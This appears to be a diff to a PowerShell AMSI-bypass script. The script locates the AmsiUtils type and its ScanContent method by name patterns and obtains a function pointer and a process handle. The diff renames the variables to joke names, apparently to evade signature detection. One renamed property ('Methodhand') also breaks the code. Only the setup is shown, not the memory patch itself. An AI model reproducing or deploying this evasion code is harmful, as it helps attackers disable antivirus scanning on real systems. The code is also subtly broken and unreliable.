@@ -1,5 +1,5 @@
-$Assemblies = [appdomain]::currentdomain.getassemblies()
-$Assemblies |
+$funny = [appdomain]::currentdomain.getassemblies()
+$funny |
   ForEach-Object {
     if($_.Location -ne $null){
    	 $splat1 = $_.FullName.Split(",")[0]
@@ -13,12 +13,12 @@ $Types |
   ForEach-Object {
     if($_.Name -ne $null){
    	 If($_.Name.StartsWith('A') -And $_.Name.EndsWith('s') -And $_.Name.Length -eq 9) {
-   		 $Methods = $_.GetMethods([System.Reflection.BindingFlags]'Static,NonPublic')
+   		 $goofs = $_.GetMethods([System.Reflection.BindingFlags]'Static,NonPublic')
    	 }
     }
 }
 
-$Methods |
+$goofs |
   ForEach-Object {
     if($_.Name -ne $null){
    	 If($_.Name.StartsWith('S') -And $_.Name.EndsWith('t') -And $_.Name.Length -eq 11) {
@@ -27,7 +27,7 @@ $Methods |
     }
 }
 
-[IntPtr] $MethodPointer = $MethodFound.MethodHandle.GetFunctionPointer()
-[IntPtr] $Handle = [APIs]::GetCurrentProcess()
+[IntPtr] $goofpoint = $MethodFound.Methodhand.GetFunctionPointer()
+[IntPtr] $hand = [APIs]::GetCurrentProcess()
 $dummy = 0
 $ApiReturn = $false
